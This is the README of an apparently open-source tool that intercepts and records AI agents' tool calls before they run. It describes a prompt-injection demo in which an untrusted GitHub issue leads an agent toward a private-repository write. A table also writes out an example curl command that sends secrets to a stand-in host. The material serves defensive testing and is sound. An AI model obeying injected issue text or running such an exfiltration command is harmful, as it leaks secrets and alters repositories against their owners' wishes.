# Fulcrum Boundary

> The action boundary for routed agent tools.

**See what your AI tools can do. Block what they should not.**

MCP is the first production route; Command and Edit are delivered previews.

Your agent is about to touch a real system. Boundary decides before the tool executes, records the verdict, and governs only routes forced through Boundary.

[![Go Reference](https://pkg.go.dev/badge/github.com/fulcrum-governance/fulcrum-boundary.svg)](https://pkg.go.dev/github.com/fulcrum-governance/fulcrum-boundary)
[![CI](https://github.com/Fulcrum-Governance/Fulcrum-Boundary/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/Fulcrum-Governance/Fulcrum-Boundary/actions/workflows/ci.yml)
[![Go Report Card](https://goreportcard.com/badge/github.com/fulcrum-governance/fulcrum-boundary)](https://goreportcard.com/report/github.com/fulcrum-governance/fulcrum-boundary)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](./LICENSE)

[Quickstart](#first-run-in-one-minute) | [Demos](./docs/DEMOS.md) | [Docs](https://fulcrum-governance.github.io/Fulcrum-Boundary/) | [Claims](./docs/CLAIMS_LEDGER.md) | [Release Truth](./docs/RELEASE_TRUTH_PUBLIC.md) | [Security](./SECURITY.md)

## Terminal Receipt — See the MCP Lane Run

This recording is a real run of `boundary demo github-lethal-trifecta`, the
Lane 1 (MCP) demo below. It shows untrusted GitHub issue context flowing into a
private-repo mutation attempt; Boundary denies the routed action before GitHub
is touched, reports `upstream_called=false`, and emits a hash-verifiable decision
record. No credentials, live calls, or real mutations are used. For the Lane 2
(Command Boundary) run, use `boundary demo command-secret-exfil`.

![Boundary denies a GitHub write-after-taint action before upstream execution, with upstream_called=false and a hash-verifiable decision record](./docs/assets/github-lethal-trifecta-demo.gif)

## What Boundary Stops

A coding agent reads an untrusted GitHub issue, then proposes a write to a
private repository — a write-after-taint action.

- **Action:** the write to the private repository, the system the agent is about to touch.
- **Route:** the request travels the **MCP route**, the first production route forced through Boundary.
- **Verdict:** Boundary returns `DENY` **before upstream**, with `reason=lethal_trifecta_detected`.
- **Record:** Boundary emits a structured decision record of that verdict (`rec_...`), checkable with `boundary verify-record`.

Boundary governs an action only when the route is forced through Boundary.
Direct access to the same tool is a bypass unless deployment topology removes
that path. The same shape holds for Command Boundary, a delivered preview, which
denies a routed secret-exfiltration command before execution.

## First-Run In One Minute

Install a prebuilt binary — no Go toolchain, no C compiler:

```bash
brew install fulcrum-governance/tap/boundary
# or: docker run --rm ghcr.io/fulcrum-governance/boundary:latest selftest
# or: download a release archive + SHA256SUMS (docs/INSTALL.md has the curl lines)

# see the MCP servers your agents can already reach — read-only, nothing is modified:
boundary init --dry-run
boundary selftest
boundary doctor --json
boundary demo github-lethal-trifecta --out lane1.txt   # Lane 1: MCP, the first production route
boundary demo command-secret-exfil --out lane2.txt     # Lane 2: Command Boundary, a delivered preview
boundary evidence bundle --include-demo --out boundary-evidence
boundary evidence verify boundary-evidence
# each demo printed `decision record path:` — check the Lane 1 record by recomputation:
boundary verify-record github-lethal-trifecta-artifacts/decision-record.json
```

> One honest capability split: the prebuilt static binaries, the Homebrew
> formula, and the container image are `CGO_ENABLED=0` builds, so the Postgres
> AST classifier (a cgo binding) is unavailable — routed SQL classifies as
> `UNKNOWN` and the Postgres guard denies it fail-closed. The static build
> never allows SQL the cgo build would deny. The `_cgo` release archives carry
> the full classifier; see [docs/INSTALL.md](./docs/INSTALL.md). These channels
> publish from the tag-gated release pipeline for `v0.10.1` and later;
> `v0.10.0` and earlier shipped source-only — use
> [Build from source](#build-from-source) for those.

> The commands above, including the uniform record-location output described
> below, plus `boundary explain` / `boundary replay`, `DecisionRecordV2`, and
> `boundary test`, ship in `v0.9.0` and later. The source install
> `go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.11.0`
> includes them.

No credentials. No live calls. No real mutations. Every record-emitting command
prints uniform lines — `decision record id: rec_...` (the record's id) and, when
a record file is written, `decision record path: <path>`: a single-record JSON
object `verify-record` consumes directly. A multi-record `decision record log:
<path>` (a `.jsonl` audit log) is written alongside; it is not a `verify-record`
input. Both proof lanes write the verifiable file under `--out`:
`boundary demo github-lethal-trifecta --json --out demo.json` lands
`github-lethal-trifecta-artifacts/decision-record.json`, and
`boundary demo command-secret-exfil --out demo.txt` lands
`command-secret-exfil-artifacts/decision-record.json`. New here? See
[docs/TROUBLESHOOTING.md](./docs/TROUBLESHOOTING.md) for the expected first-run
states (a clean checkout shows `doctor` surfaces as `warn`, and
`evidence verify` reports `parsed_records: 0` — both are normal).

One quickstart command reports on your machine rather than the fixtures:
`boundary init --dry-run` reads the MCP client configs your agents already use
and prints `configs discovered`, `servers discovered`, `high-risk servers`, and
`mcp config mutation: none`. It is read-only — it writes no files and edits no
configs.

### Forge the receipt

A standing challenge. The Lane 1 demo above landed its verdict in a
hash-verifiable decision record; `boundary verify-record` recomputes the
decision hash from the record's own fields and compares it to the stored one.
The record's canonical bytes follow RFC 8785 (JCS), so an independent, stock
RFC 8785 implementation recomputes the same `decision_hash` — standalone
verifiers ship in [Python](./verifiers/python/),
[TypeScript](./verifiers/typescript/), and [Rust](./verifiers/rust/), each
pinned to the Go implementation by the same committed conformance vectors, so
you can verify a record in Go, Python, TypeScript, or Rust. That
conformance statement is scoped to the decision record;
it is not a claim that Boundary as a whole is standards-conformant.
Records can also be signed with Ed25519 — off by default;
`boundary verify-record --verify-signature --public-key <key>` checks the
signature over the recomputed `decision_hash` and fails closed. A valid
signature proves only that the holder of that key signed the record, not that
the verdict was correct or the action prevented, and it does not solve key
custody ([`docs/SIGNING.md`](./docs/SIGNING.md)).
A plain audit log can be quietly edited. Try that here — fixture-only, like the
demos: no credentials, no live calls, no real mutations:

```bash
boundary demo github-lethal-trifecta --out lane1.txt
boundary verify-record github-lethal-trifecta-artifacts/decision-record.json
# -> record verification: ok

# forge it: open the record and change "action": "deny" to "action": "allow"
boundary verify-record github-lethal-trifecta-artifacts/decision-record.json
# -> record verification failed: decision_hash mismatch: got sha256:... want sha256:...
#    exit code 1
```

The edited verdict fails recomputation — you did not have to trust this repo to
check it. The same discipline gates the words you are reading: from a source
checkout, `go test ./claims/...` runs the claims-ledger and language-lint gate,
and this repo's CI fails the build if the README claims more than the tests
prove. Hash-verifiable means exactly that — an edited record fails
recomputation. What the record does and does not establish is covered in
[The Record It Leaves](#the-record-it-leaves).

### Build from source

Requires Go 1.25+. The default build links the full Postgres SQL classifier
(`pganalyze/pg_query_go`) via cgo, so it also needs a C toolchain (gcc/clang
on `PATH`):

```bash
go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.11.0
```

Without a C toolchain, `CGO_ENABLED=0 go build ./cmd/boundary` builds the
static variant described above (routed SQL classifies as `UNKNOWN` and is
denied fail-closed instead of being classified).

## Test Policies Like Code

`boundary test` runs local, fixture-only policy-as-code assertions against an
operator's own policy bundles. It is built for CI: a case supplies a routed
request fixture and an expected verdict, and Boundary exits non-zero on a
mismatch, malformed case, unexpected policy-load error, or failed
`parse_rejection` expectation.

```bash
# from a source checkout — the sample corpus is not shipped in the binary archives:
boundary test --path tests/fixtures/policy-test/cases
boundary test --path tests/fixtures/policy-test/cases --format json
# in CI, point --path at your own case directory
```

It reports policy verdicts for routed request fixtures only. Passing tests do
not prove production route enforcement or deployment bypass resistance. See
[docs/POLICY_TESTING.md](./docs/POLICY_TESTING.md).

## Two Proof Lanes

The launch is a tight spine of **two fixture-only proof lanes** — not a breadth-of-adapters list. Each denies a dangerous action pattern before it runs and emits a hash-verifiable decision record. The two lanes carry equal weight: **Lane 1** is the MCP route (the first production route) and **Lane 2** is Command Boundary (a delivered preview). Everything else ships as a labeled preview (see [Adapter Readiness](#adapter-readiness)).

![Two equal-weight proof lanes — Lane 1 (MCP, the first production route) denies a write-after-taint GitHub action before upstream with upstream_called=false; Lane 2 (Command Boundary, a delivered preview) denies a routed secret-exfiltration command before execution with executed=false. Both are fixture-only, use no credentials, make no network calls, perform no live mutation, and emit a hash-verifiable decision record.](./docs/assets/two-lane-proof.svg)

| Lane | Status | Demo | What is denied | Verified shape |
|---|---|---|---|---|
| **Lane 1 — MCP** (the first production route) | Production | `boundary demo github-lethal-trifecta` | A write-after-taint GitHub action, denied **before upstream** | `actual=DENY`, `upstream_called=false`, `reason=lethal_trifecta_detected` |
| **Lane 2 — Command Boundary** (a delivered preview, routed-only) | Delivered preview | `boundary demo command-secret-exfil` | A routed `curl -d [redacted] https://example.invalid` secret exfiltration, denied **before execution** | `actual=DENY`, `executed=false`, `class=C6` |

Both lanes are fixture-only: no credentials, no network, no live mutation, each
emitting a `rec_...` decision record with a `sha256:` decision hash. The static
poster above renders both lanes at equal weight; the two-lane table is the
canonical proof summary. A linear, single-lane
[deny-before-upstream walkthrough](./docs/assets/boundary-demo-walkthrough.svg)
is also available as a no-JS fallback for the MCP lane; it is a stylized diagram,
not a literal capture.

## The Record It Leaves

Every governed verdict produces a structured decision record
([docs/DECISION_RECORDS.md](./docs/DECISION_RECORDS.md)). Where configured, that
record is receipt-grade — carrying request, policy bundle, and decision hashes —
so tampering after emission is detectable by recomputation with
`boundary verify-record` ([docs/RECEIPTS.md](./docs/RECEIPTS.md)). Bundle and
re-check the local fixture-safe evidence with `boundary evidence bundle` and
`boundary evidence verify` ([docs/EVIDENCE_BUNDLE.md](./docs/EVIDENCE_BUNDLE.md)).
To confirm a route is forced through Boundary before relying on a verdict, work
through the [route conformance checklist](./docs/ROUTE_CONFORMANCE_CHECKLIST.md).

The `upstream_called=false` and `executed=false` fields are adapter self-reports
of their own control flow; they are **not** fields of the hashed record and are
**not** independently corroborated by it. Boundary does not emit `proved`
decisions itself.

## What It Proves

| Scope | Proof shown by the local fixture |
|---|---|
| Inventory | Boundary can read a fixture MCP client config and list reachable tools. |
| Risk graph | Boundary can connect untrusted GitHub context to a private-repo mutation path. |
| Starter policy | Boundary can generate local starter policies that parse through its verifier. |
| Secure GitHub preview | Boundary can deny the tested write-after-taint fixture before GitHub is touched. |
| Decision record | Boundary records the verdict and reason for the governed route. |

## What It Does Not Prove

| Limit | Why it matters |
|---|---|
| Every malicious prompt | The fixture covers the tested write-after-taint path, not every possible issue or agent behavior. |
| Production Secure GitHub status | Secure GitHub remains preview until deployment bypass evidence and broader live coverage are recorded. |
| Protection for direct tool calls | Boundary governs routed tools. Direct access to the same tool is a bypass unless deployment topology blocks it. |
| Complete production policy | Generated policies are starter policies for operator review. |
| Hosted monitoring | The dashboard reads local artifacts only. |

## Core Model

```mermaid
flowchart LR
  A[Agent intent] --> B[Proposed action]
  B --> C{Boundary}
  C -->|allow| D[Execute routed action]
  C -->|deny / warn / escalate / require approval| E[No execution or approval path]
  C --> F[Decision record]
```

Boundary governs actions only when the route is forced through Boundary.

## Current Release Truth

| Surface | Status | Limit |
|---|---|---|
| MCP adapter | Production | Governs MCP routes forced through Boundary. |
| Secure GitHub | Preview | Fixture proof and opt-in conformance do not close deployment bypasses. |
| Command Boundary | Delivered preview | Routed command paths only. |
| Edit Boundary | Delivered preview | Routed edit envelopes only. |
| Policy-as-code testing | Local-only | `boundary test` checks routed request fixtures against local policy bundles. |
| Policy generation | Starter policy utility | Requires operator review. |
| Dashboard | Local artifact visibility | Not hosted monitoring. |

## Adapter Readiness

Adapter maturity is declared in `adapters/<adapter>/readiness.yaml` and summarized in [docs/ADAPTER_READINESS_MATRIX.md](./docs/ADAPTER_READINESS_MATRIX.md).

### Production

- `adapters/mcp`: MCP routes forced through Boundary.

### Preview

- `adapters/a2a`: A2A lifecycle adapter with deployment bypass proof still required.
- `adapters/cli`: CLI wrapper path with sole-execution-path evidence still required.
- `adapters/codeexec`: Code execution adapter with named sandbox and bypass proof still required.
- `adapters/grpc`: gRPC adapter with deployment and streaming evidence still required.
- `adapters/managedagents`: Managed Agents lifecycle surface pending live upstream conformance.
- `adapters/securegithub`: Secure GitHub preview pending deployment bypass proof.
- `adapters/webhook`: Webhook adapter with downstream sole-action-path evidence still required.

## Product Surfaces

| Surface | What it proves today | Limit |
|---|---|---|
| MCP Firewall | Inventory, risk graph, starter policy generation, local dashboard artifacts. | Local visibility does not secure servers by itself. |
| Secure GitHub preview | Denies the fixture write-after-taint path before upstream mutation. | Not a production Secure GitHub claim. |
| Command Boundary preview | Routes selected project command paths through Boundary. | Direct shell paths outside the route are not governed. |
| Edit Boundary preview | Routes selected edit envelopes through Boundary. | Direct file writes outside the route are not governed. |
| Evidence utilities | Bundle and verify local receipts. | Receipts do not prove production safety by themselves. |

## Docs Map

| Need | Start here |
|---|---|
| Install | [docs/INSTALL.md](./docs/INSTALL.md) |
| First-run troubleshooting | [docs/TROUBLESHOOTING.md](./docs/TROUBLESHOOTING.md) |
| Demo | [docs/DEMO_GITHUB_LETHAL_TRIFECTA.md](./docs/DEMO_GITHUB_LETHAL_TRIFECTA.md) |
| Govern your MCP server — put Boundary in front of an MCP client, trigger a denial, uninstall | [docs/GOVERN_MCP_SERVER.md](./docs/GOVERN_MCP_SERVER.md) |
| Where Boundary fits — vs scanners, gateways, guardrail libraries, authz engines | [docs/COMPARISON.md](./docs/COMPARISON.md) |
| Standards & incident mapping — OWASP Agentic, NSA MCP CSI, Five Eyes | [docs/STANDARDS_MAPPING.md](./docs/STANDARDS_MAPPING.md) |
| Full spec | [docs/BOUNDARY_SPEC.md](./docs/BOUNDARY_SPEC.md) |
| Claims | [docs/CLAIMS_LEDGER.md](./docs/CLAIMS_LEDGER.md) |
| Testing | [docs/TESTING.md](./docs/TESTING.md) |
| Release truth | [docs/RELEASE_TRUTH_PUBLIC.md](./docs/RELEASE_TRUTH_PUBLIC.md) |
| Adapter readiness | [docs/ADAPTER_READINESS_MATRIX.md](./docs/ADAPTER_READINESS_MATRIX.md) |
| Route conformance | [docs/ROUTE_CONFORMANCE_CHECKLIST.md](./docs/ROUTE_CONFORMANCE_CHECKLIST.md) |
| Decision records | [docs/DECISION_RECORDS.md](./docs/DECISION_RECORDS.md) |
| Receipt-grade records | [docs/RECEIPTS.md](./docs/RECEIPTS.md) |
| Evidence bundle | [docs/EVIDENCE_BUNDLE.md](./docs/EVIDENCE_BUNDLE.md) |
| MCP Firewall | [docs/firewall/DISCOVERY_INVENTORY.md](./docs/firewall/DISCOVERY_INVENTORY.md) |
| Secure GitHub | [docs/secure-mcp/GITHUB.md](./docs/secure-mcp/GITHUB.md) |
| Command Boundary | [docs/command-boundary/README.md](./docs/command-boundary/README.md) |
| Edit Boundary | [docs/edit-boundary/README.md](./docs/edit-boundary/README.md) |
| Govern Claude Code tool calls (PreToolUse hook) | [docs/integrations/CLAUDE_CODE_HOOK.md](./docs/integrations/CLAUDE_CODE_HOOK.md) |
| Security | [SECURITY.md](./SECURITY.md) |

## Development

```bash
make selftest
make demo-github
make release-check
```

## Tests

```bash
go test ./claims/... -count=1
go test ./... -count=1 -timeout 5m
make docs-build
```

## Part of the Fulcrum Architecture

Boundary is the downloadable action boundary in the Fulcrum repo family:

| Repo | Role |
|---|---|
| [`Fulcrum-Boundary`](https://github.com/Fulcrum-Governance/Fulcrum-Boundary) | Enforces routed action decisions before privileged tool execution. |
| [`fulcrum-io`](https://github.com/Fulcrum-Governance/fulcrum-io) | Hosted product and operator surfaces. |
| [`fulcrum-trust`](https://github.com/Fulcrum-Governance/fulcrum-trust) | Trust modeling package used by broader Fulcrum work. |
| [`Fulcrum-Proofs`](https://github.com/Fulcrum-Governance/Fulcrum-Proofs) | Lean proof work consumed through documented correspondence and release claims. |

Boundary consumes proof-backed contracts through documented correspondence and decision-mode boundaries; it does not emit `proved` decisions itself. See [docs/PROOF_BOUNDARY.md](./docs/PROOF_BOUNDARY.md).

## License

Apache 2.0 - see [LICENSE](./LICENSE).

## Contributing

See [CONTRIBUTING.md](./CONTRIBUTING.md). For security issues, see [SECURITY.md](./SECURITY.md).
